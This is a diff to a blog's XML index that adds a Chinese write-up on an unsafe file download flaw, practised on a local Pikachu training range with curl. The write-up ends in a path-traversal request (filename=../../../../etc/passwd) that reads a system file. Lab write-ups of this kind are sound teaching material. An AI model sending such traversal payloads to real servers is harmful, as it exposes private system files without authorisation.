@@ -4,6 +4,35 @@
   
   
   <entry>
+    <title>文件下载(Unsafe File Download)</title>
+    <link href="/Crow.github.io/2026/10/28/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-Unsafe-File-Download/"/>
+    <url>/Crow.github.io/2026/10/28/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-Unsafe-File-Download/</url>
+    
+    <content type="html"><![CDATA[<p>工具:curl</p><p>环境:本地 Pikachu 靶场</p><p>内容:验证网页文件下载漏洞存在</p><p>原理:网站把“用户给的文件名”直接拿过去读,没有进行限制,类似于文件包含,区别是文件下载是把文件内容给你,而文件包含是打开文件并交给php解析.</p><h2 id="1-进入本地靶场"><a href="#1-进入本地靶场" class="headerlink" title="1,进入本地靶场"></a>1,进入本地靶场</h2><img width="2470" height="928" alt="Image" src="https://github.com/user-attachments/assets/23e38104-2cd8-4797-b502-8487536ba8a9" /><h2 id="2-先下载一个科比看看路径-找下载的入口"><a href="#2-先下载一个科比看看路径-找下载的入口" class="headerlink" title="2,先下载一个科比看看路径(找下载的入口)"></a>2,先下载一个科比看看路径(找下载的入口)</h2><img width="2480" height="968" alt="Image" src="https://github.com/user-attachments/assets/53f8df30-d05c-4b40-83a6-40950d7119a9" /><p>发现路径没变</p><h2 id="3-查看下载链接指向哪儿"><a href="#3-查看下载链接指向哪儿" class="headerlink" title="3,查看下载链接指向哪儿"></a>3,查看下载链接指向哪儿</h2><p>我们在终端用 <code>curl -s &#39;http://127.0.0.1:8080/vul/unsafedownload/down_nba.php&#39; | grep -oE &#39;href=&quot;[^&quot;]+&quot;&#39; | head -n 20</code> 查看</p><img width="1360" height="640" alt="Image" src="https://github.com/user-attachments/assets/08fca313-8b99-49d3-aa08-eb83a94c7ced" /><p>前面全是 CSS，球员链接应该在页面后面。</p><h2 id="4-换成看尾部"><a href="#4-换成看尾部" class="headerlink" title="4,换成看尾部"></a>4,换成看尾部</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s <span class="hljs-string">&#x27;http://127.0.0.1:8080/vul/unsafedownload/down_nba.php&#x27;</span> | grep -oE <span class="hljs-string">&#x27;href=&quot;[^&quot;]+&quot;&#x27;</span> | <span class="hljs-built_in">tail</span> -n 30<br></code></pre></td></tr></table></figure><img width="1440" height="812" alt="Image" src="https://github.com/user-attachments/assets/c1221253-3482-4e51-be9f-b4fe046b0eca" /><p>找到了下载口execdownload.php?filename&#x3D;kb.png</p><h2 id="5-验证漏洞存在"><a href="#5-验证漏洞存在" class="headerlink" title="5,验证漏洞存在"></a>5,验证漏洞存在</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s -D - <span class="hljs-string">&#x27;http://127.0.0.1:8080/vul/unsafedownload/execdownload.php?filename=../../../../etc/passwd&#x27;</span><br></code></pre></td></tr></table></figure><img width="1518" height="796" alt="Image" src="https://github.com/user-attachments/assets/468394ca-c233-44c6-9dca-7ed5223fa5a8" /><p>返回200,文件内容也对的上</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>文件下载</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Pikachu</tag>
+      
+      <tag>文件下载</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>文件包含local</title>
     <link href="/Crow.github.io/2026/10/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlocal/"/>
     <url>/Crow.github.io/2026/10/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlocal/</url>
@@ -24,9 +53,9 @@
       
       <tag>Curl</tag>
       
-      <tag>文件包含</tag>
+      <tag>Pikachu</tag>
       
-      <tag>皮卡丘</tag>
+      <tag>文件包含</tag>
       
     </tags>
     
